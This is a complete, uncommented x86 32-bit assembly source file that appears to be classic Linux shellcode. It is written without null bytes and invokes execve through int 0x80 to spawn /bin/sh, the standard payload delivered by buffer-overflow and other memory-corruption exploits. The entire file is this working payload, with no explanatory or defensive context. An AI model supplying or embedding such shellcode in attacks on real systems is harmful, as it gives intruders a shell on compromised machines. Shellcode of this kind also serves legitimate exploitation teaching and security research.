global _start

section .text

_start:

	push 0x0b
	pop eax
	xor edx, edx
	push edx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	mov ecx, edx

	int 0x80


